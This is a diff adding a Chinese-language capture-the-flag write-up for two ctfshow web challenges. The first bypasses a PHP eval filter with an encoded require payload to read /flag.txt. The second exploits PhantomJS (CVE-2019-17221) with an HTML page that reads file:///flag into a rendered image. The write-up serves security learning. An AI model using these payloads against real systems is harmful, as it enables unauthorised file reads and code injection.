@@ -1360,6 +1360,39 @@
 
 <p>还是一个代码审计，我们简单分析一下，这里需要我们传入一个GET 的code参数和在会话中设置一个login，然后对code进行正则匹配，判断为真则将清空session中code的值，不然的话会输出hacker</p>
 <p>这里因为没有给出waf的代码，所以我们需要进行fuzz，而且题目也提示了fuzz，那我们用bp进行fuzz测试一下</p>
+<p>通过测试发现过滤了单双引号，括号，反引号，字符 f 以及一些常用函数，加上题目提示我们 flag在 &#x2F;flag.txt中，那个就应该是要读取文件内容了</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219084711378.png" alt="image-20241219084711378"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#96;</p>
+<p>我们解析一下这两个payload，先说第一个，先说第一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>其中<code>？&gt;</code>符号可以被当作<code>;</code>解析，而我们这里因为很多符号都被禁用了，我们的思路就是利用eval(“$_SESSION[“ . $code . “]&#x3D;false;”);，而利用方法就是去闭合这里的eval(“$_SESSION[“去想办法读取flag，因为;在黑名单里但是&lt;&gt;?不在黑名单里，所以我们尝试构造?code&#x3D;]?&gt;&lt;?去机械能bypass，然后我又发现我们的()都在黑名单里，所以能读取文件的函数也很少了，但是我们可以发现题目中有require “hidden_filter.php”;的代码，我就想到了用require去进行读取文件</strong></p>
+<h3 id="require函数"><a href="#require函数" class="headerlink" title="require函数"></a>require函数</h3><p><strong>在 PHP 中，<code>require</code> 语句用于引入并执行指定的 PHP 文件，例如require ‘path&#x2F;to&#x2F;your&#x2F;file.php’;</strong></p>
+<p><strong>但是这里单引号和空格都被过滤了，就又卡住了，后面看了大佬的wp发现他们是用的<del>去进行绕过的，require</del>flag.txt，但是这里的话f是被过滤了的，最后就是将flag.txt进行转换一下就可以了，例如取反，所以才有的payload</strong></p>
+<h2 id="RemoteImageDownloader"><a href="#RemoteImageDownloader" class="headerlink" title="RemoteImageDownloader"></a>RemoteImageDownloader</h2><p>可参考CVE-2019-17221考点为<a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/">PhantomJS任意文件读取</a></p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219092943000.png" alt="image-20241219092943000"></p>
+<p>这个的话是一个从远程加载图片进行下载的题目，这里的话我的思路就是用服务器创建html文件，然后通过download去访问我们的html文件，达到一个攻击的效果</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">			 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> 			x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript"> 			x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"> 			<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript"> 			&#125;;</span></span><br><span class="line"><span class="language-javascript"> 			x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///flag&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> 			x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"> 			</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093238973.png" alt="image-20241219093238973"></p>
+<p>然后我们访问这个1.html，就会进行下载图片，图片中就会带出我们的flag</p>
+<p>我们来解释一下那个html文件中的script片段</p>
+<ul>
+<li><code>new XMLHttpRequest;</code> 创建一个新的 XMLHttpRequest 对象 <code>x</code>。这个对象用于在客户端与服务器之间进行异步请求。</li>
+<li><code>x.onload=function()&#123; document.write(this.responseText) &#125;;</code> 定义了当请求完成后要执行的函数。在这个函数中，<code>this.responseText</code> 包含了从服务器返回的响应内容。<code>document.write()</code> 方法会将该内容写入当前文档。</li>
+<li><code>x.open(&quot;GET&quot;,&quot;file:///flag&quot;);</code> 准备一个 HTTP GET 请求，目标是一个本地文件（<code>file:///flag</code>）。这是一个文件系统的路径，通常用于尝试从本地读取一个文件。</li>
+<li><code>x.send();</code> 发送请求。</li>
+</ul>
+<p>所以这里可以看到其实我们的flag是写入了这个下载的图片中的，也就是我们的响应内容中，假如没有执行file:&#x2F;&#x2F;flag的话，就会只有一个空图片</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093531467.png" alt="image-20241219093531467"></p>
+<p>而如果我们进行了正确的攻击后就会</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093559492.png" alt="image-20241219093559492"></p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
